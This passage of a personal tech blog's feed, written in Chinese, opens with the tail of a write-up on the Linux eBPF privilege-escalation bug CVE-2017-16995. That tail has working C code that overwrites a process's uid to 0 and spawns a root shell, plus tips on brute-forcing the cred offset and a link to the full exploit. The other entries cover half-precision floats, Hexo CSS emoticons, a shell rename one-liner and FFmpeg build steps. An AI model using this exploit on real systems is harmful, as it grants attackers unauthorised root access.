class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line"><span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"uidptr      = %lx\n"</span>, uidptr);</span><br><span class="line">uid_read=__read(uidptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"uid get=%lx,read=%lx\n"</span>,uid_get, uid_read);</span><br><span class="line"><span class="keyword">if</span>((uid_read&amp;<span class="number">0xffffffff</span>)==uid_get)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"uid get=%lx,read=%lx\n"</span>,uid_get, uid_read);</span><br><span class="line">__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cred_offset = %lx\n"</span>, credoffset);</span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"spawning root shell\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/bash"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"failed\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想到原作者<code>Vitaly Nikolenko</code>给的<code>CRED_OFFSET=0x5f8</code>，我这边通过<code>rebeyond</code><a href="https://www.cnblogs.com/rebeyond/p/8603056.html#commentform" target="_blank" rel="noopener">这里</a>给出的方法获取的是<code>0x670</code>，猜测这个值应该范围不大，尝试了一下用<code>0x400~0x800</code>爆破，很不幸，第一次尝试失败，被系统给killed掉啦：</p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1521563596473.png" width="213"><p>调整一下范围：0x500~0x800，ok 搞定！</p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1521637032613.png" width="215"><blockquote><p>不同机器此CRED_OFFSET偏移量可能还有差异，可以<code>视情况稍微调整一下范围</code>，试出结果应该不难。</p></blockquote><p>最后来体验一把提权后带来的快感，root用户想干嘛干嘛，如图：</p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1521567818252.png" width="386"><p>完整代码见<a href="https://raw.githubusercontent.com/ljf1239848066/linux-kernel-exploits/master/CVE-2017-16995/upstream44v5.c" target="_blank" rel="noopener">这里</a>。</p><blockquote><p>参考链接：</p><ul><li><a href="http://www.freebuf.com/news/165608.html" target="_blank" rel="noopener">http://www.freebuf.com/news/165608.html</a></li><li><a href="https://cert.360.cn/warning/detail?id=119f849891f2a1b5deef65f99923ab5a" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=119f849891f2a1b5deef65f99923ab5a</a></li><li><a href="https://www.cnblogs.com/rebeyond/p/8603056.html#commentform" target="_blank" rel="noopener">https://www.cnblogs.com/rebeyond/p/8603056.html#commentform</a></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Ubuntu本地提权初探&quot;&gt;&lt;a href=&quot;#Ubuntu本地提权初探&quot; class=&quot;headerlink&quot; title=&quot;Ubuntu本地提权初探&quot;&gt;&lt;/a&gt;Ubuntu本地提权初探&lt;/h1&gt;&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;该漏洞存在于带有 eBPF bpf(2)系统（CONFIG_BPF_SYSCALL）编译支持的Linux内核中，是一个&lt;strong&gt;内存任意读写&lt;/strong&gt;漏洞。该漏洞是由于&lt;code&gt;eBPF&lt;/code&gt;验证模块的计算错误产生的。普通用户可以构造特殊的BPF来触发该漏洞，此外恶意攻击者也可以使用该漏洞来进行本地提权操作。&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux-kernel-exploits" scheme="http://blog.lxzh.app/tags/linux-kernel-exploits/"/>
    
  </entry>
  
  <entry>
    <title>Half Precision float</title>
    <link href="http://blog.lxzh.app/2017/12/09/Half-Precision-float/"/>
    <id>http://blog.lxzh.app/2017/12/09/Half-Precision-float/</id>
    <published>2017-12-08T16:22:44.000Z</published>
    <updated>2018-03-20T18:25:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Half-precision-floating-point-format"><a href="#Half-precision-floating-point-format" class="headerlink" title="Half-precision floating-point format"></a>Half-precision floating-point format</h1><pre><code>bit15:         1 bit SIGN      +---+-------+--------------+bit14-10:      5 bit EXP       | S | EEEEE | MM MMMM MMMM |bit0-9:       10 bit MAN       +---+-------+--------------+</code></pre><blockquote><p>参考 IEEE754-2008 WIKIPEDIA:<a href="https://en.wikipedia.org/wiki/Half-precision_floating-point_format" target="_blank" rel="noopener">Half-precision floating-point format</a> </p></blockquote><p>Hall-precision floating-point number 半精度浮点数，文中简称<code>fp16</code></p><h1 id="1-计算公式"><a href="#1-计算公式" class="headerlink" title="1.计算公式"></a>1.计算公式</h1><h2 id="Denormal-number"><a href="#Denormal-number" class="headerlink" title="Denormal number:"></a>Denormal number:</h2><p>E=<code>00000</code>   $ y=(-1)^S\times \frac{M}{2^{10}} \times 2^{-14}$ </p><h2 id="Normal-number"><a href="#Normal-number" class="headerlink" title="Normal number:"></a>Normal number:</h2><p>E=<code>00001</code>~<code>11110</code>   $y=(-1)^S\times(1+\frac{M}{2^{10}}) \times 2^{E-15}$</p><h2 id="Inf：Infinity"><a href="#Inf：Infinity" class="headerlink" title="Inf：Infinity"></a>Inf：Infinity</h2><p>E=<code>11111</code> M=<code>00000 00000</code></p><h2 id="NaN-Not-a-number"><a href="#NaN-Not-a-number" class="headerlink" title="NaN: Not a number"></a>NaN: Not a number</h2><p>E=<code>11111</code> M&gt;0</p><a id="more"></a><h1 id="2-小数转fp16"><a href="#2-小数转fp16" class="headerlink" title="2.小数转fp16"></a>2.小数转fp16</h1><p>例如：9.125</p><h2 id="1-转换为二进制表示"><a href="#1-转换为二进制表示" class="headerlink" title="1) 转换为二进制表示"></a>1) 转换为二进制表示</h2><p>9-&gt;<code>1001</code>         $2^3+1$<br>0.125-&gt;<code>0.001</code>  $2^{-3}$<br>9.125-&gt;<code>1001.001</code></p><h2 id="2-转换为二进制科学计数法"><a href="#2-转换为二进制科学计数法" class="headerlink" title="2) 转换为二进制科学计数法"></a>2) 转换为二进制科学计数法</h2><p><code>1001.001</code>-&gt;$1.001001\times2^3$</p><h2 id="3-标准化"><a href="#3-标准化" class="headerlink" title="3) 标准化"></a>3) 标准化</h2><p>fp16总共<code>16bit</code>，其中尾数<code>10bit</code>，由于任何一个数(0除外)转换为<code>二进制科学计数法</code>后，整数部分一定是<code>1</code>，所以该bit可以不表示，及<code>隐藏1个bit</code>，用10bit尾数表示小数部分</p><p>因此将小数部分(尾数)补齐到10bit为：<code>00100 10000</code> </p><p>fp16中指数位占<code>5bit</code>，可以表示<code>0~31</code>，为了让fp16既能表示整数，也能表示小数，我们给指数E加一个<code>bias=15</code>，将<code>-15~16</code>扩充到<code>0~31</code></p><p>所以3+15=18：<code>10010</code></p><p>指数占<code>1bit</code>，用<code>0表示整数</code>，<code>1表示负数</code></p><p>综上：<br><code>9.125</code>表示为fp16对应的二进制值为：<code>0</code> <code>10010</code> <code>00100 10000</code></p><h2 id="4-公式还原"><a href="#4-公式还原" class="headerlink" title="4) 公式还原"></a>4) 公式还原</h2><p>符号：S=<code>0</code><br>指数：E=<code>b10010</code>=18<br>尾数：M=<code>b00100 10000</code>=144<br>浮点数值：$y=(-1)^0\times(1+\frac{144}{2^{10}})\times2^{18-15}=1.140625\times8=9.125$</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Half-precision-floating-point-format&quot;&gt;&lt;a href=&quot;#Half-precision-floating-point-format&quot; class=&quot;headerlink&quot; title=&quot;Half-precision floating-point format&quot;&gt;&lt;/a&gt;Half-precision floating-point format&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;bit15:         1 bit SIGN      +---+-------+--------------+
bit14-10:      5 bit EXP       | S | EEEEE | MM MMMM MMMM |
bit0-9:       10 bit MAN       +---+-------+--------------+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;参考 IEEE754-2008 WIKIPEDIA:&lt;a href=&quot;https://en.wikipedia.org/wiki/Half-precision_floating-point_format&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Half-precision floating-point format&lt;/a&gt; &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Hall-precision floating-point number 半精度浮点数，文中简称&lt;code&gt;fp16&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;1-计算公式&quot;&gt;&lt;a href=&quot;#1-计算公式&quot; class=&quot;headerlink&quot; title=&quot;1.计算公式&quot;&gt;&lt;/a&gt;1.计算公式&lt;/h1&gt;&lt;h2 id=&quot;Denormal-number&quot;&gt;&lt;a href=&quot;#Denormal-number&quot; class=&quot;headerlink&quot; title=&quot;Denormal number:&quot;&gt;&lt;/a&gt;Denormal number:&lt;/h2&gt;&lt;p&gt;E=&lt;code&gt;00000&lt;/code&gt;   $ y=(-1)^S\times \frac{M}{2^{10}} \times 2^{-14}$ &lt;/p&gt;
&lt;h2 id=&quot;Normal-number&quot;&gt;&lt;a href=&quot;#Normal-number&quot; class=&quot;headerlink&quot; title=&quot;Normal number:&quot;&gt;&lt;/a&gt;Normal number:&lt;/h2&gt;&lt;p&gt;E=&lt;code&gt;00001&lt;/code&gt;~&lt;code&gt;11110&lt;/code&gt;   $y=(-1)^S\times(1+\frac{M}{2^{10}}) \times 2^{E-15}$&lt;/p&gt;
&lt;h2 id=&quot;Inf：Infinity&quot;&gt;&lt;a href=&quot;#Inf：Infinity&quot; class=&quot;headerlink&quot; title=&quot;Inf：Infinity&quot;&gt;&lt;/a&gt;Inf：Infinity&lt;/h2&gt;&lt;p&gt;E=&lt;code&gt;11111&lt;/code&gt; M=&lt;code&gt;00000 00000&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;NaN-Not-a-number&quot;&gt;&lt;a href=&quot;#NaN-Not-a-number&quot; class=&quot;headerlink&quot; title=&quot;NaN: Not a number&quot;&gt;&lt;/a&gt;NaN: Not a number&lt;/h2&gt;&lt;p&gt;E=&lt;code&gt;11111&lt;/code&gt; M&amp;gt;0&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hexo博客正文嵌入QQ表情</title>
    <link href="http://blog.lxzh.app/2017/02/18/HexoInsertQQImg/"/>
    <id>http://blog.lxzh.app/2017/02/18/HexoInsertQQImg/</id>
    <published>2017-02-18T13:26:41.000Z</published>
    <updated>2019-11-06T18:21:07.828Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp; &ensp; &ensp;在迁移以前CSDN的文章到<code>Hexo</code>时，发现CSDN文章一个比较好玩的东东就是可以在内容中加入QQ表情，于是想弄到Hexo里面。</p><h1 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h1><p>&ensp; &ensp; &ensp;一开始想到的做法是把QQ表情下载下来，上传到七牛，然后用<code>Markdown</code>插入图片功能插入图片。</p><a id="more"></a><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1487431266519.png" width="605">&ensp; &ensp; &ensp;由于`Markdown`插入图片不支持调整图片显示大小，QQ表情图片大于行高，预览的时候就被pass掉。&ensp; &ensp; &ensp;想到`Markdown`支持原生`html`语法，于是就想用`html`的`img标签`插入图片，调整一下显示大小。编辑预览时发现显示挺正常的，如下图所示：<img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1487425063747.png" width="917">&ensp; &ensp; &ensp;可是在网页里预览却令人大跌眼镜，这是个什么鬼：<img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1487425242052.png" width="112">&ensp; &ensp; &ensp;而且网页里，这个表情点击后还可以弹出来预览，真是画蛇添足。<p>&ensp; &ensp; &ensp;看了一下生成后网页的源代码，如下：<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1487425455886.png" width="748"><br>&ensp; &ensp; &ensp;估计是<code>Fancybox</code>搞的鬼，它对<code>html</code>格式<code>img标签</code>做了什么处理吧，这种简单的做法在<code>Hexo</code>里不可取，只能另寻方案！</p><p>&ensp; &ensp; &ensp;还好以前接触过一点点<code>css</code>，稍微懂得一点点，可以用<code>background:url(xxx)</code>的方式将图片作为标签文字的背景嵌入，这样表情就不能点击。</p><h1 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h1><p>&ensp; &ensp; &ensp;首先想到的是<code>a标签</code>，于是自定义了几个样式，用于不同的QQ表情，分别引用不同的表情url。<em>（Hexo主题自定义css样式，见文末）</em></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#自定义CSS</span><br><span class="line">a.qqangry &#123;background:url(https://lxzh.oss-cn-hangzhou.aliyuncs.com/qqimg/angry.gif)   no-repeat center center;background-size:90%;&#125;</span><br><span class="line">a.qqawkward &#123;background:url(https://lxzh.oss-cn-hangzhou.aliyuncs.com/qqimg/awkward.gif) no-repeat center center;background-size:90%;&#125;</span><br><span class="line">a.qqcry &#123;background:url(https://lxzh.oss-cn-hangzhou.aliyuncs.com/qqimg/cry.gif)   no-repeat center center;background-size:90%;&#125;</span><br><span class="line">a.qqcurse &#123;background:url(https://lxzh.oss-cn-hangzhou.aliyuncs.com/qqimg/curse.gif)   no-repeat center center;background-size:90%;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Markdown正文中引入a标签插入表情</span><br><span class="line">生气表情前面的文字<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"qqangry"</span>&gt;</span>&amp;ensp; &amp;ensp;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>表情后面的文字</span><br><span class="line">哭泣表情前面的文字<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"qqcry"</span>&gt;</span>&amp;ensp; &amp;ensp;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>表情后面的文字</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp;网页预览一下，貌似还可以，如下图：<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1487428636512.png" width="268"><br>&ensp; &ensp; &ensp;<font color="lightblue"> 注：上图中使用了两个空格占位符，不然表情没法显示(PS:没有更好的办法，如有大神，请不吝指导一下)，本文中段落首行缩进也是用了三个空格占位符<code>&amp;ensp; &amp;ensp; &amp;ensp;</code></font><br>&ensp; &ensp; &ensp;不过，看着总觉得有点怪怪的，文字下面那一横线看着有点不爽，怎么把它去掉呢？</p><h1 id="方案三"><a href="#方案三" class="headerlink" title="方案三"></a>方案三</h1><p>&ensp; &ensp; &ensp;想到几年前自己复制hao123网址大全自己做了一个个人导航网页，如下每个文字前面的图标，用到的是<code>i标签</code>实现的：<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1487429276094.png" width="635"><br>&ensp; &ensp; &ensp;于是，尝试将方案二中的<code>a标签</code>换成<code>i标签</code>，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#自定义CSS</span><br><span class="line">i.qqangry   &#123;background:url(https://lxzh.oss-cn-hangzhou.aliyuncs.com/qqimg/angry.gif)       no-repeat center center;background-size:90%;&#125;</span><br><span class="line">i.qqawkward &#123;background:url(https://lxzh.oss-cn-hangzhou.aliyuncs.com/qqimg/awkward.gif)     no-repeat center center;background-size:90%;&#125;</span><br><span class="line">i.qqcry     &#123;background:url(https://lxzh.oss-cn-hangzhou.aliyuncs.com/qqimg/cry.gif)         no-repeat center center;background-size:90%;&#125;</span><br><span class="line">i.qqcurse   &#123;background:url(https://lxzh.oss-cn-hangzhou.aliyuncs.com/qqimg/curse.gif)       no-repeat center center;background-size:90%;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Markdown正文中引入i标签插入表情</span><br><span class="line">生气表情前面的文字<span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"qqangry"</span>&gt;</span>&amp;ensp; &amp;ensp;<span class="tag">&lt;/<span class="name">i</span>&gt;</span>表情后面的文字</span><br><span class="line">哭泣表情前面的文字<span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"qqcry"</span>&gt;</span>&amp;ensp; &amp;ensp;<span class="tag">&lt;/<span class="name">i</span>&gt;</span>表情后面的文字</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp;效果如下：<br>生气表情前面的文字<i class="qqangry">&ensp; &ensp;</i>表情后面的文字<br>哭泣表情前面的文字<i class="qqcry">&ensp; &ensp;</i>表情后面的文字<br>&ensp; &ensp; &ensp;那讨厌的横线终于没了，大功告成！！！<i class="qqproud">&ensp; &ensp;</i></p><h1 id="附一：Hexo主题自定义CSS样式"><a href="#附一：Hexo主题自定义CSS样式" class="headerlink" title="附一：Hexo主题自定义CSS样式"></a>附一：Hexo主题自定义CSS样式</h1><p>&ensp; &ensp; &ensp;<a href="http://blog.csdn.net/captain_magicer/article/details/49073873" target="_blank" rel="noopener"><font color="blue">这里</font></a>有篇文章讲得比较详细，我简单重复啰嗦一下。<br>&ensp; &ensp; &ensp;本博用的是<code>Hexo</code>的<code>NexT-Mist</code>主题，找到博客<code>themes\next\source\css</code>目录下的<code>main.styl</code>文件，在文末加入一行<code>@import &quot;_myCss/myCss&quot;;</code>，然后在<code>css</code>目录下新建一个<code>_myCss</code>目录，并新建一个文本文件，保存为<code>myCss.styl</code>文件，编辑该文件即可自定义各种css样式啦，祝使用愉快~<i class="qqtongue">&ensp; &ensp;</i></p><h1 id="附二：QQ表情排队集合"><a href="#附二：QQ表情排队集合" class="headerlink" title="附二：QQ表情排队集合"></a>附二：QQ表情排队集合</h1><p><i class="qqangry">&ensp; &ensp;</i><i class="qqawkward">&ensp; &ensp;</i><i class="qqbye">&ensp; &ensp;</i><i class="qqcrazy">&ensp; &ensp;</i><i class="qqcry">&ensp; &ensp;</i><i class="qqcurse">&ensp; &ensp;</i><i class="qqcute">&ensp; &ensp;</i><i class="qqdespise">&ensp; &ensp;</i><i class="qqdoubt">&ensp; &ensp;</i><i class="qqenvy">&ensp; &ensp;</i><i class="qqfastcry">&ensp; &ensp;</i><i class="qqknock">&ensp; &ensp;</i><i class="qqlaugh">&ensp; &ensp;</i><i class="qqmad">&ensp; &ensp;</i><i class="qqohmy">&ensp; &ensp;</i><i class="qqpanic">&ensp; &ensp;</i><i class="qqproud">&ensp; &ensp;</i><i class="qqquiet">&ensp; &ensp;</i><i class="qqsad">&ensp; &ensp;</i><i class="qqshutup">&ensp; &ensp;</i><i class="qqshy">&ensp; &ensp;</i><i class="qqsleep">&ensp; &ensp;</i><i class="qqsmile">&ensp; &ensp;</i><i class="qqstruggle">&ensp; &ensp;</i><i class="qqtitter">&ensp; &ensp;</i><i class="qqtongue">&ensp; &ensp;</i><i class="qqwail">&ensp; &ensp;</i><i class="qqwronged">&ensp; &ensp;</i></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp;在迁移以前CSDN的文章到&lt;code&gt;Hexo&lt;/code&gt;时，发现CSDN文章一个比较好玩的东东就是可以在内容中加入QQ表情，于是想弄到Hexo里面。&lt;/p&gt;
&lt;h1 id=&quot;方案一&quot;&gt;&lt;a href=&quot;#方案一&quot; class=&quot;headerlink&quot; title=&quot;方案一&quot;&gt;&lt;/a&gt;方案一&lt;/h1&gt;&lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp;一开始想到的做法是把QQ表情下载下来，上传到七牛，然后用&lt;code&gt;Markdown&lt;/code&gt;插入图片功能插入图片。&lt;/p&gt;
    
    </summary>
    
    
      <category term="css" scheme="http://blog.lxzh.app/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>ShellCmd</title>
    <link href="http://blog.lxzh.app/2017/01/08/ShellCmd/"/>
    <id>http://blog.lxzh.app/2017/01/08/ShellCmd/</id>
    <published>2017-01-08T05:34:07.000Z</published>
    <updated>2017-02-03T15:55:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>Mac shell小技巧</p><pre><code>COUNT=0;dir=$(eval pwd); for name in $(ls $dir);do COUNT=$(($COUNT+1));param=$(eval printf &quot;%03d&quot; $COUNT);mv $name frame$param.png; done</code></pre><p>将当前目录下所有图片文件按顺序格式化递增序号重命名<br>输出文件格式：<code>xxx%03d.png</code><br><strong>说明：</strong><br><code>$(eval pwd)</code>：获取当前目录<br><code>for name in $(ls $dir)</code>：遍历当前目录下所以文件<br><code>COUNT=$(($COUNT+1))</code>：计数器+1<br><code>param=$(eval printf &quot;%03d&quot; $COUNT)</code>：计数器三位前向补零格式化<br><code>mv $name frame$param.png</code>：文件重命名</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Mac shell小技巧&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;COUNT=0;dir=$(eval pwd); for name in $(ls $dir);do COUNT=$(($COUNT+1));param=$(eval printf &amp;quot;%03d&amp;quot; $
      
    
    </summary>
    
    
      <category term="Shell" scheme="http://blog.lxzh.app/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>Compile And Install FFmpeg</title>
    <link href="http://blog.lxzh.app/2017/01/08/Compile-And-Install-FFmpeg/"/>
    <id>http://blog.lxzh.app/2017/01/08/Compile-And-Install-FFmpeg/</id>
    <published>2017-01-08T05:33:18.000Z</published>
    <updated>2017-02-17T15:29:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>(<a href="http://www.osxexperts.net/ffmpeg/ffmpegexperts.html" target="_blank" rel="noopener">The original link</a>﻿)</p><h2 id="STEP-1-Preparations"><a href="#STEP-1-Preparations" class="headerlink" title="STEP 1 - Preparations"></a>STEP 1 - Preparations</h2><h3 id="Install-Xcode-include-git"><a href="#Install-Xcode-include-git" class="headerlink" title="Install Xcode(include git)"></a>Install <code>Xcode</code>(include <code>git</code>)</h3><h2 id="STEP-2-Downloading-all-necessary-source-codes"><a href="#STEP-2-Downloading-all-necessary-source-codes" class="headerlink" title="STEP 2 - Downloading all necessary source codes"></a>STEP 2 - Downloading all necessary source codes</h2><p>Download all file into a folder named <code>FFmpeg</code> on the your disk:</p><h3 id="1、FFmpeg-source-code"><a href="#1、FFmpeg-source-code" class="headerlink" title="1、FFmpeg source code"></a>1、FFmpeg source code</h3><ul><li>Open the Terminal</li><li>write the following in the Terminal : <code>git clone git://git.videolan.org/ffmpeg.git ffmpeg</code><br>Because <code>FFmpeg</code> needs several extra codecs you need some other source codes too. </li></ul><h3 id="2、MP3lame-source-code"><a href="#2、MP3lame-source-code" class="headerlink" title="2、MP3lame source code"></a>2、MP3lame source code</h3><ul><li>Go to <code>http://lame.sourceforge.net/download.php</code></li><li>Download lame source</li></ul><a id="more"></a><h3 id="3、Ogg-Vorbis-and-Theora-source-code"><a href="#3、Ogg-Vorbis-and-Theora-source-code" class="headerlink" title="3、Ogg, Vorbis and Theora source code"></a>3、Ogg, Vorbis and Theora source code</h3><ul><li>Go to <code>http://xiph.org/downloads/</code></li><li>Download the following sources: <code>libogg</code> source , <code>libvorbis</code> source and <code>libtheora</code> source.</li></ul><h3 id="4、X264-source-code-for-H264-support"><a href="#4、X264-source-code-for-H264-support" class="headerlink" title="4、X264 source code (for H264 support)"></a>4、X264 source code (for H264 support)</h3><ul><li>Open the Terminal</li><li>write the following in the Terminal : <code>git clone git://git.videolan.org/x264.git</code></li></ul><h3 id="5、VP8-source-code"><a href="#5、VP8-source-code" class="headerlink" title="5、VP8 source code"></a>5、VP8 source code</h3><ul><li>Open the terminal</li><li>write the following in the Terminal : <code>git clone git://review.webmproject.org/</code>libvpx.git</li></ul><h3 id="6、Xvid-source-code"><a href="#6、Xvid-source-code" class="headerlink" title="6、Xvid source code"></a>6、Xvid source code</h3><ul><li>Go to <code>http://www.xvid.org/Downloads.43.0.html</code></li><li>Download <code>Xvid</code> source code</li></ul><blockquote><p>All source code has been downloaded <a href="https://github.com/ljf1239848066/FFmpeg/tree/master/zip" target="_blank" rel="noopener">here</a>.</p></blockquote><h2 id="STEP-3-Compiling-all-source-codes"><a href="#STEP-3-Compiling-all-source-codes" class="headerlink" title="STEP 3 - Compiling all source codes"></a>STEP 3 - Compiling all source codes</h2><p>Open the Terminal and copy paste every line below marked <strong>BOLD</strong>.</p><pre><code>DISK_ID=$(hdid -nomount ram://26214400) &amp;&amp; newfs_hfs -v tempdisk ${DISK_ID} &amp;&amp; diskutil mount ${DISK_ID} &amp;&amp; SOURCE=&quot;/Volumes/tempdisk/sw&quot; &amp;&amp; COMPILED=&quot;/Volumes/tempdisk/compile&quot; &amp;&amp; mkdir ${SOURCE} &amp;&amp; mkdir ${COMPILED} &amp;&amp; export PATH=${SOURCE}/bin:$PATH</code></pre><h3 id="Compiling-YASM"><a href="#Compiling-YASM" class="headerlink" title="Compiling YASM:"></a>Compiling YASM:</h3><pre><code>cd ${COMPILED} || exit 1cd yasm-1.2.0./configure --prefix=${SOURCE} &amp;&amp; make -j 4 &amp;&amp; make install</code></pre><h3 id="Compiling-LIBVPX"><a href="#Compiling-LIBVPX" class="headerlink" title="Compiling LIBVPX"></a>Compiling LIBVPX</h3><pre><code>cd ${COMPILED}cd libvpx./configure --prefix=${SOURCE} --disable-shared &amp;&amp; make -j 4 &amp;&amp; make install</code></pre><h3 id="Compiling-LAME"><a href="#Compiling-LAME" class="headerlink" title="Compiling LAME"></a>Compiling LAME</h3><pre><code>cd ${COMPILED}cd lame-3.99./configure --prefix=${SOURCE} --disable-shared --enable-static &amp;&amp; make -j 4 &amp;&amp; make install</code></pre><h3 id="Compiling-XVIDCORE"><a href="#Compiling-XVIDCORE" class="headerlink" title="Compiling XVIDCORE"></a>Compiling XVIDCORE</h3><pre><code>cd ${COMPILED}cd xvidcorecd build/generic./configure --prefix=${SOURCE} --disable-shared --enable-static --disable-assembly &amp;&amp; make -j 4 &amp;&amp; make installrm ${SOURCE}/lib/libxvidcore.4.dylib</code></pre><h3 id="Compiling-X264"><a href="#Compiling-X264" class="headerlink" title="Compiling X264"></a>Compiling X264</h3><pre><code>cd ${COMPILED}cd x264./configure --prefix=${SOURCE} --disable-shared --enable-static &amp;&amp; make -j 4 &amp;&amp; make install &amp;&amp; make install-lib-static</code></pre><h3 id="Compiling-LIBOGG"><a href="#Compiling-LIBOGG" class="headerlink" title="Compiling LIBOGG"></a>Compiling LIBOGG</h3><pre><code>cd ${COMPILED}cd libogg-1.3.0./configure --prefix=${SOURCE} --disable-shared --enable-static &amp;&amp; make -j 4 &amp;&amp; make install</code></pre><h3 id="Compiling-LIBVORBIS"><a href="#Compiling-LIBVORBIS" class="headerlink" title="Compiling LIBVORBIS"></a>Compiling LIBVORBIS</h3><pre><code>cd ${COMPILED}cd libvorbis-1.3.2./configure --prefix=${SOURCE} --with-ogg-libraries=${SOURCE}/lib --with-ogg-includes=/Volumes/tempdisk/sw/include/ --enable-static --disable-shared &amp;&amp; make -j 4 &amp;&amp; make install</code></pre><h3 id="Compiling-LIBTHEORA"><a href="#Compiling-LIBTHEORA" class="headerlink" title="Compiling LIBTHEORA"></a>Compiling LIBTHEORA</h3><pre><code>cd ${COMPILED}cd libtheora-1.1.1./configure --prefix=${SOURCE} --with-ogg-libraries=${SOURCE}/lib --with-ogg-includes=${SOURCE}/include/ --with-vorbis-libraries=${SOURCE}/lib --with-vorbis-includes=${SOURCE}/include/ --enable-static --disable-shared &amp;&amp; make -j 4 &amp;&amp; make install</code></pre><p><del>Compiling ZLIB</del></p><pre><code>cd ${COMPILED}cd zlib./configure --prefix=${SOURCE} &amp;&amp; make -j 4 &amp;&amp; make installrm ${SOURCE}/lib/libz*dylibrm ${SOURCE}/lib/libz.so*</code></pre><h3 id="Compiling-FFMPEG"><a href="#Compiling-FFMPEG" class="headerlink" title="Compiling FFMPEG"></a>Compiling FFMPEG</h3><pre><code>cd ${COMPILED}cd ffmpegexport LDFLAGS=&quot;-L${SOURCE}/lib&quot;export CFLAGS=&quot;-I${SOURCE}/include&quot;./configure --prefix=${SOURCE} --enable-gpl --enable-pthreads --disable-ffplay --disable-ffserver --enable-libvpx --disable-decoder=libvpx --enable-libmp3lame --enable-libtheora --enable-libvorbis --enable-libx264 --enable-libxvid --enable-avfilter  --enable-filters --arch=x86 --enable-runtime-cpudetect &amp;&amp; make -j 4 &amp;&amp; make install </code></pre><blockquote><p>After doing all the hardcore compiling you are awarded a FFmpeg binary in the <code>sw/BIN</code> folder. <a href="https://github.com/ljf1239848066/FFmpeg/tree/master/bin" target="_blank" rel="noopener">Here</a> is my binary.</p></blockquote><h2 id="Test："><a href="#Test：" class="headerlink" title="Test："></a>Test：</h2><pre><code>$&gt; mkdir frames$&gt; ./ffmpeg -i input.mp4 -r 10 frames/frame%03d.png$&gt; ./ffmpeg -t 